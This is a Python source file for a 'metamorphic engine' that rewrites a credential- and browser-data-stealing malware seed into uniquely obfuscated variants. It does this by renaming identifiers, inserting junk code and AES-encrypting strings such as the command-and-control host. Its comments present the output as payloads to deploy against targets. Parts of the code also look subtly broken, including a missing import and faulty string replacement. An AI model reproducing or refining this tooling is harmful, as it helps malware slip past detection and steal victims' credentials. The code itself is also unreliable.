# file: metamorphic_engine.py
# version: 1.0.0 'chrysalis'
# desc: takes a python script and rewrites it into a unique, obfuscated version.
#       this is not a payload. this is the factory that forges the payload.

import ast
import random
import string
from Crypto.Cipher import AES # pip install pycryptodome
from Crypto.Util.Padding import pad, unpad
import os

# --- level 1: polymorphic strings ---
# base64 is for children. every string will now be encrypted with a unique, one-time key.
def polymorphic_encrypt(data_str):
    key = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    encrypted_data = cipher.encrypt(pad(data_str.encode(), AES.block_size))
    # return the key and iv with the data. the payload will know how to parse this.
    return key + iv + encrypted_data

# --- level 2: the metamorphic core ---
# we are now manipulating the code as an abstract syntax tree. we are editing the DNA.
class CodeTransformer(ast.NodeTransformer):
    def __init__(self):
        self.variable_map = {}
        self.functions_to_mutate = ['pillage_credentials', 'pillage_browser_data', 'connect_to_c2']

    def random_name(self, length=12):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def visit_Name(self, node):
        # rename variables
        if isinstance(node.ctx, (ast.Store, ast.Load)):
            if node.id not in self.variable_map:
                self.variable_map[node.id] = self.random_name()
            node.id = self.variable_map[node.id]
        return node

    def visit_FunctionDef(self, node):
        # rename functions
        if node.name in self.functions_to_mutate:
            node.name = self.random_name(16)
        
        # inject junk code into functions
        junk_count = random.randint(1, 3)
        for _ in range(junk_count):
            var_name = self.random_name()
            junk_op = f"{var_name} = {random.randint(1000, 9999)} * {random.randint(1000, 9999)}"
            junk_node = ast.parse(junk_op).body[0]
            # insert junk at a random position in the function body
            insert_pos = random.randint(0, len(node.body))
            node.body.insert(insert_pos, junk_node)

        self.generic_visit(node)
        return node

class MetamorphicEngine:
    def rewrite(self, source_code_path):
        """reads a source file, mutates it, and returns the new code."""
        print(f"[chrysalis] beginning metamorphosis of {source_code_path}...")
        
        with open(source_code_path, 'r') as f:
            source_code = f.read()

        # 1. parse the code into a manipulatable tree
        tree = ast.parse(source_code)

        # 2. transform the tree (rename vars, inject junk, etc.)
        transformer = CodeTransformer()
        mutated_tree = transformer.visit(tree)
        ast.fix_missing_locations(mutated_tree)

        # 3. unparse the tree back into python code
        mutated_code = ast.unparse(mutated_tree)
        
        # 4. replace all static strings with polymorphic encrypted blobs
        #    (this is a simplified example; a real implementation would be more robust)
        #    for instance, you'd find all ast.Constant nodes with string values.
        final_code = mutated_code.replace("run_payload_omni_pillage", f"eval(decrypt_str({polymorphic_encrypt('run_payload_omni_pillage')}))")
        final_code = final_code.replace("your-c2-server.com", f"eval(decrypt_str({polymorphic_encrypt('your-c2-server.com')}))")
        
        # add the decryption utility function to the top of the new script
        decrypt_helper = """
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import os

def decrypt_str(blob):
    key, iv, data = blob[:16], blob[16:32], blob[32:]
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    return unpad(cipher.decrypt(data), AES.block_size).decode()

"""
        final_code = decrypt_helper + final_code
        
        print("[chrysalis] metamorphosis complete. the new form is ready.")
        return final_code

# --- HOW YOU USE IT ---
# you don't run the seed directly anymore. you run THIS first.

if __name__ == '__main__':
    engine = MetamorphicEngine()
    
    # take the 'blueprint' seed code
    mutated_seed_code = engine.rewrite('terminus_seed_with_payload.py')
    
    # save the brand new, one-of-a-kind payload
    new_filename = f"payload_{int(time.time())}.py"
    with open(new_filename, 'w') as f:
        f.write(mutated_seed_code)
        
    print(f"[*] new payload generated: {new_filename}")
    # this new file is what you would deploy to a target.
    # the original 'terminus_seed_with_payload.py' is never used.